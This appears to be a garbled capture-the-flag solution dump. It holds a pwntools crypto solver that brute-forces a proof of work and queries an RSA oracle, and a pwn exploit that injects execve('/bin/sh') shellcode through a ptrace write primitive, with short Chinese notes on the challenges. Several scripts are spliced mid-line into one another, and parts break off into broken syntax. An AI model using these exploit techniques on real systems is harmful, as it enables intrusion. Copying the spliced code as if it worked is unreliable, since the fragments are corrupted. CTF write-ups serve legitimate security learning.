def proof_of_work():
    rev = r.recvuntil("sha256")
    rec = r.recvline().decode()
    suffix = re.findall(r'\(XXXX\+(.*?)\)', rec)[0]
    tar = re.findall(r'== (.*?)\n', rec)[0]
    def f(x):
        hashresult = hashlib.sha256(x.encode()+suffix.encode()).hexdigest()
        return hashresult == tar
    prefix = util.iters.mbruteforce(f, string.digits + string.ascii_letters, 4, 
'upto')
    r.sendlineafter(b'Give me XXXX: ', prefix)
r = remote(HOST, POST)
proof_of_work()
r.recvline()
n = int(r.recvline())
e = int(r.recvline())
print(n,e)
r.recvline()
ress = []
for _ in range(2):
    c0 = int(r.recvline())
    print(c0)
    for j in range(15):
        c = c0*pow(2**480+2**(480+j*24)+1,e,n)%n
        r.sendlineafter(':', str(c))
    r.recvuntil('cipher:')
    res = eval(r.recvline())
    ress.append(res)
ss = [1]
q = 2**24
for i in range(1,16):
    res = ress[0]
    cand0 = set()
    tar = res[:20][-i]
    for j in range(1,i):
        tar -= res[20:40][-j-1]*ss[i-j]
PWN
red_high_heels
条件竞争, 尽可能短的patch原来的指令为execve("/bin/sh\x00", 0, 0)
    tar%=q
    for cand in range(1,1> ')
    Num(n)
def Execve(name, wait=True):
    Cmd(3, wait)
    if(wait):
        sh.recvuntil(': ')
    sh.sendline(name)
def Ptrace(pid, pos, cont):
    Cmd(4, False)
    sh.sendline("%d %d %d"%(pid, pos, cont))
def PtraceL(pid, pos, cont):
    for i in range(0, len(cont), 8):
        Ptrace(pid, pos, u64(cont[i:i+8].ljust(8, '\x00')))
def GDB():
    gdb.attach(sh, '''
    telescope (0x00007ffff0000b20) 16
    ''')
#GDB()
n=1700
for i in range(n):
    Execve('redflag', False)
Execve('👠', False)
#shellcode
'''
mov rax, 0x68732f6e69622f
'''
Ptrace(1600, 0x2, 0x68732f6e69622f)
'''
exp = asm('mov rdi, rsp') 
exp+= asm('mov rax, 0x3b')[0:5]
exp+= asm()
'''
Ptrace(1600, 0xB, 0x3bc0c748e78948)
'''
exp = asm('xor rdx, rdx')
exp+= asm('xor rsi, rsi')
exp+= asm('syscall')
'''
dy_maze
没去符号，直接pwntools可以定位maze函数，糊一个就可以把key整出来了 最后溢出有个xor，简单糊一
下就行了
Ptrace(1600, 0xB+8+2, 0x50ff63148d23148)
for i in range(n+1):
    sh.recvuntil('>> ')
#Cmd(5)
#sh.send('A'*0xFF)
sh.interactive()
from pwn import *
from os import popen
def getBinary():
    popen("rm ./pwn/*")
    s.recvuntil("You can run the solver with:")
    cmd = s.recvuntil("===================",drop=True).strip()
    cmd = 'zsh -c "'+cmd+'"'
    ans = popen(cmd).readlines()[0]
    s.sendlineafter("Solution?",ans)
    # s.interactive()
    s.recvuntil("==== Binary Download Start ====")
    binary = s.recvuntil("==== Binary Download END ====",drop=True)
    f = open("./pwn/chall","wb")
    f.write(b64d(binary))
    f.close()
    popen('bunzip2 ./pwn/chall')
    print popen('cd pwn && tar -zxvf chall.out').readline()
    popen('rm ./pwn/chall.out')
    popen('mv ./pwn/* ./pwn/chall')
def getAnswer(addr,idx):
    func = binary_text[addr:]
    func = func[:func.find('\xc9\xc3')]
    pc = 0
    while pc >","1")
    s.sendafter("Please input the content",buf)
def free(idx):
    s.sendlineafter(">>","2")
    s.sendlineafter("idx:",str(idx))
def show(idx):
    s.sendlineafter(">>","3")
    s.sendlineafter("idx",str(idx))
def edit(idx,buf):
    s.sendlineafter(">>","4")
    s.sendlineafter("idx",str(idx))